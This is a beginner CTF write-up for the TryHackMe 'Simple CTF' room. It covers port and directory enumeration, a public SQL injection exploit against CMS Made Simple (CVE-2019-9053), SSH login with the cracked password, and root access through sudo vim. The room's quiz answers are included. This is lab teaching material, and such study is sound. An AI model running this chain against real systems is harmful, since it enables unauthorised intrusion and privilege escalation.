<p align="center">
  THM : Simple CTF<br>
  Difficulty : Easy<br>
  <img src="https://i.imgur.com/TdJUzQ4.png">
</p>

## Summary

- [Nmap scan](#nmap-scan)
- [Website enumeration](#website-enumeration)
- [SQL Injection](#sql-injection)
- [Get the user flag](#get-the-user-flag)
- [Privilege escalation](#privilege-escalation)
- [Conclusion](#conclusion)

## Nmap scan
```
┌──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/Simple_CTF]
└─$ nmap 10.10.48.140 -A -p- -oN nmapResults.txt
Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-01 16:41 CEST
Nmap scan report for 10.10.48.140
Host is up (0.031s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.95.171
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.41 seconds
```

- We can login to the ftp service as ftp user on port 21.
- There is a website on port 80.
- The ssh service is running on port 2222.

**Question : How many services are running under port 1000 ?**  
**Answer : 2**  

**Question : What is running on the higher port ?**  
**Answer : ssh**

## Website enumeration

### Summary

- [Gobuster enumeration](#gobuster-enumeration)
- [Manual enumeration](#manual-enumeration)

### Gobuster enumeration

```
──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/Simple_CTF]
└─$ gobuster dir -u http://10.10.48.140/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.48.140/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/01 16:54:58 Starting gobuster in directory enumeration mode
===============================================================
/simple               (Status: 301) [Size: 313] [--> http://10.10.48.140/simple/]
/server-status        (Status: 403) [Size: 300]                                  
                                                                                 
===============================================================
2022/10/01 17:06:46 Finished
===============================================================
```

### Manual enumeration

If we go to the /simple directory found by [Gobuster](https://github.com/OJ/gobuster), we see that a CMS is installed on the server. 
It's `CMS Made Simple`.  
![](https://i.imgur.com/nZExa05.png)  

We can see the current installed version at the bottom of the page :  
![](https://i.imgur.com/j4PoLr8.png)  

If we search for it on [Exploit-DB](https://www.exploit-db.com/), we can see that the current installed version of 
CMS Made Simple is vulnerable to SQL Injections :  
![](https://i.imgur.com/hQ1ytbD.png)  

We can see the corresponding CVE :  
![](https://i.imgur.com/Hxa15eQ.png)  

**Question : What's the CVE you're using against the application ?**  
**Answer : CVE-2019-9053**

**Question : What kind of vulnerability is the application vulnerable ?**  
**Answer : sqli**  

## SQL Injection

Let's use the exploit found on [Exploit-DB](https://www.exploit-db.com/). The exploit will use a time based sql injection to retrieve informations 
about the admin account of the CMS. Let's see the available options of this exploit :  
```
Options:
  -h, --help            show this help message and exit
  -u URL, --url=URL     Base target uri (ex. http://10.10.10.100/cms)
  -w WORDLIST, --wordlist=WORDLIST
                        Wordlist for crack admin password
  -c, --crack           Crack password with wordlist
```

The exploit can also crack the password hash with a given wordlist. Let's try to crack it with rockyou.txt using  
`python2 46635.py -u http://10.10.48.140/simple/ -w /usr/share/wordlist/rockyou.txt -c` :  
```
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Now we have the admin credentials of the CMS. If we try to use the same credentials to login via SSH :  
```
┌──(attacker㉿AttackBox)-[~/Documents/TryHackMe/CTF/Simple_CTF]
└─$ ssh mitch@10.10.48.140 -p 2222
The authenticity of host '[10.10.48.140]:2222 ([10.10.48.140]:2222)' can't be established.
ED25519 key fingerprint is SHA256:iq4f0XcnA5nnPNAufEqOpvTbO8dOJPcHGgmeABEdQ5g.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.48.140]:2222' (ED25519) to the list of known hosts.
mitch@10.10.48.140's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190
$ 
```

It works ! We have a shell on the machine now.  

**Question : What's the password ?**  
**Answer : secret**  

**Question : Where can you login with the details obtained ?**  
**Answer : ssh**  

## Get the user flag

The user.txt flag is located in `/home/mitch`.
```
$ ls
user.txt
$ cat user.txt
********, *****!
```

We have the user flag !

**Question : What's the user flag ?**  
**Answer : \*\*\*\*\*\*\*\*\*, \*\*\*\*\*\*!**  

## Privilege escalation

If we look in the /home directory, there is another user :  
```
$ cd ..
$ ls
mitch  sunbath
```

If we use `sudo -l`, we see that mitch can use vim as root without any password. Let's see on [GTFOBins](https://gtfobins.github.io/) how to elevate our privileges using vim :  
![](https://i.imgur.com/G28XSLj.png)

Let's use `sudo vim -c ':!/bin/bash'` :  
```
$ sudo vim -c ':!/bin/sh'

# whoami
root
```

And we are root ! We can now get the root flag. It is located in /root :  
```
# cd /root
# ls
root.txt
# cat root.txt  
**** ****. ***********!
```

**Question : Is there any other user in the home directory ? What's its name ?**  
**Answer : sunbath**  

**Question : What can you leverage to spawn a privileged shell ?**  
**Answer : vim**  

**Question : What's the root flag ?**  
**Answer : \*\*\*\* \*\*\*\*. \*\*\*\*\*\*\*\*\*\*!**

## Conclusion

I think this room is a good CTF to start with if you are a beginner. It's really well guided. Thanks for this room !
